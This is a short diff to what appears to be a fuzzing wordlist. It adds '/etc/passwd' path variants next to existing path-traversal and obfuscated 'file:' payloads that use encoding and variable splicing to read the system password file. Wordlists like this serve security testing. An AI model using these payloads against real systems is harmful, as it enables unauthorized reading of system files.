@@ -1,3 +1,6 @@
+etc/passwd
+/etc/passwd
+//etc/passwd
 ../xxxml_db/../../../../../etc/passwd
 file:${br}/et${u}c%252Fpas${te}swd%3F/
 file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
